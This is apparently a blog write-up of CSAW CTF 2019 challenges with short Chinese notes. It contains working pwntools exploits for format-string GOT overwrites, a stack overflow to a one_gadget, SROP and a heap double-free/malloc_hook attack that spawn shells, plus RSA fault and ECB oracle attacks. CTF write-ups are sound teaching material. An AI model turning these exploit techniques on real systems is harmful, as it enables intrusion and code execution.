---
layout: post
title:  "CSAWCTF2019-Writeup"
date:   2019-9-16
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# CSAWCTF2019-Writeup

* ### beleaf

  ```python
  fuck = [1,9,17,39,2,0,18,3,8,18,9,18,17,1,3,19,4,3,5,21,46,10,3,10,18,3,1,46,22,46,10,18,6]
  dic = {
      0: 'w', 1: 'f', 2:'{', 3:'_', 4:'n', 5:'y', 6:'}', 8:'b',
      9: 'l', 10:'r', 17: 'a', 18: 'e', 19: 'i', 
      21: 'o', 22: 't', 39: 'g', 
      46: 'u'
  }
  flag = ''
  
  for i in fuck:
  	flag += dic.get(i)
  print(flag)
  ```

* ### GOT Milk?

  ```
  from pwn import *
  r = remote('pwn.chal.csaw.io',1004)
  #r = process('./gotmilk')
  elf = ELF('./gotmilk')
  lose_got = elf.got['lose']
  #test = 'aaaa%7$x'
  #win_offset = 0x1189
  payload = p32(lose_got)+'%133c%7$hhn'
  r.sendline(payload)
  r.interactive()
  ```

* ### baby_boi

  ```python
  from pwn import *
  r = remote('pwn.chal.csaw.io',1005)
  libc = ELF('./libc-2.27.so')
  r.recvuntil('Here I am: 0x')
  printf = r.recvuntil('\n',drop = True)
  printf = int(printf,16)
  libc_base = printf - libc.symbols['printf']
  one = libc_base + 0x4f322 
  r.sendline('a'*40+p64(one))
  r.interactive()
  ```

* ### small_boi

  SROP

  ```python
  from pwn import *
  context.arch = 'amd64'
  r = remote('pwn.chal.csaw.io', 1002)
  binsh = 0x4001ca
  sigreturn = 0x400180
  syscall = 0x400185
  fuck = SigreturnFrame(kernel='amd64')
  fuck.rax = 59
  fuck.rdi = binsh
  fuck.rsi = 0
  fuck.rdx = 0
  fuck.rip = syscall
  payload = 'a'*0x28 + p64(sigreturn) + str(fuck)
  r.sendline(payload)
  r.interactive()
  ```

  

* ### Popping Caps

  只能操作7次，有double free

  操作7次后执行bye，里面有个malloc(0x38)，暗示改malloc_hook

  read从buf取指针，只能写刚malloc的chunk

  free时index没有检查，可以在堆上任意free

  先free一个大chunk，再free这个大chunk中的一个小chunk

  然后malloc，read写入malloc_hook，下一次malloc到malloc_hook，再写one_gadget

  ```python
  from pwn import *
  #r = remote('pwn.chal.csaw.io',1001)
  r = process('./popping_caps')
  elf = ELF('./popping_caps')
  libc = ELF('./libc.so.6')
  def malloc(size):
  	r.recvuntil('Your choice:')
  	r.sendline('1')
  	r.recvuntil('How many:')
  	r.sendline(str(size))
  
  def free(index):
  	r.recvuntil('Your choice:')
  	r.sendline('2')
  	r.recvuntil('Whats in a free:')
  	r.sendline(str(index))
  
  def write(txt):
  	r.recvuntil('Your choice:')
  	r.sendline('3')
  	r.recvuntil('Read me in:')
  	r.send(txt)
  
  r.recvuntil('Here is system 0x')
  system = int(r.recvuntil('\n',drop =True),16)
  libc_base = system - libc.symbols['system']
  log.info('libc_base:'+hex(libc_base))
  malloc_hook = libc_base+libc.symbols['__malloc_hook']
  log.info('malloc_hook:'+hex(malloc_hook))
  one = libc_base+0x10a38c
  log.info('one:'+hex(one))
  
  malloc(0x3a8)
  free(0)
  free(-0x210)
  malloc(0xf8)
  write(p64(malloc_hook))
  malloc(0x10)
  write(p64(one))
  r.interactive()
  ```

  

* ### SuperCurve

  ```python
  a = 1
  b = -1
  p = 14753
  E = EllipticCurve(Zmod(p), [a, b])
  G = E(1, 1)
  P = E(x, y)
  d = discrete_log(P, G, operation="+")
  print d
  ```

  

* ### Fault Box

  ```
  ====================================
              fault box
  ====================================
  1. print encrypted flag
  2. print encrypted fake flag
  3. print encrypted fake flag (TEST)
  4. encrypt
  ====================================
  ```

  e=65537，没有给出n

  选择4加密

  $c_2 ≡  2^e\ mod\ n$

  $c_4 ≡  4^e\ mod\ n$

  $c_8 ≡  8^e\ mod\ n$

  

  $c_2^2 ≡  c_4\ mod\ n$

  $c_2^3 ≡  c_8\ mod\ n$

  

  $c_2^2 - c_4=  kn$

  $c_2^3 - c_8=  tn$

  $n = gcd(c_2^3 - c_8,c_2^2 - c_4)$

  可以得到n

  ```python
      # ===== FUNCTIONS FOR PERSONAL TESTS, DON'T USE THEM =====
      def TEST_CRT_encrypt(self, p, fun=0):
          ep = inverse(self.d, self.p-1)
          eq = inverse(self.d, self.q-1)
          qinv = inverse(self.q, self.p)
          c1 = pow(p, ep, self.p)
          c2 = pow(p, eq, self.q) ^ fun
          h = (qinv * (c1 - c2)) % self.p
          c = c2 + h*self.q
          return c
  ```

  ep = eq = e

  正确使用CRT加密

  ![1](https://raw.githubusercontent.com/AiDaiP/images/master/CSAWCTF/1.png)

  题目中的TEST_CRT_encrypt中c2与fun异或

  ![2](https://raw.githubusercontent.com/AiDaiP/images/master/CSAWCTF/2.png)

  所以$p=gcd(c-m^e,n)$

  即$p=gcd(c_{fake}-c_{real},n)$

  然后解密flag

  
  
* ### byte_me

  ECB

  加密逻辑如下

  ```python
  def bolck_encrypt(plain):
      res = ''
      for i in range(0, len(plain), 16):
          res += enc(plain[i:i+16])
      return res
  
  bolck_encrypt(salt + user_input + flag)
  ```

  先找salt长度，假设salt长度为12

  ```
  'saltsaltsaltsalt'+'aaaaaa'+flag
  'saltsaltsaltsalt'+'aaaaaa'+'a'+flag
  ```

  根据前密文前16字节相同可以得到salt长度

  然后爆破flag

  ```
  'aaaaaaaaaaaaaaa'+''
  'aaaaaaaaaaaaaaa'+'f'
  ```

  密文16字节相同

  ```
  from pwn import *
  r = remote('node3.buuoj.cn',28028)
  
  def oracle(x):
      r.sendlineafter('Tell me something: ', x)
      r.recvline()
      return r.recvline().strip()
  
  
  enc = r.recvline().strip()
  prev = enc[:32]
  for i in range(1, 17):
      now = oracle('a' * i)[:32]
      if prev == now:
          salt = 16 - i + 1
          break
      prev = now
  
  log.success(salt)
  
  flag = ''
  for block in range(1, 5):
      log.info(block)
      for i in range(16):
          x = 'a' * (16 - salt) + 'a' * (16 - 1 - i)
          target = oracle(x)[32 * block:32 * (block + 1)]
          for c in string.printable:
              now = oracle(x + flag + c)[32 * block:32 * (block + 1)]
              if now == target:
                  flag += c
                  log.info(flag)
                  if flag.endswith('}'):
                      log.success(flag)
                      exit()
                  break
  
  
  ```

  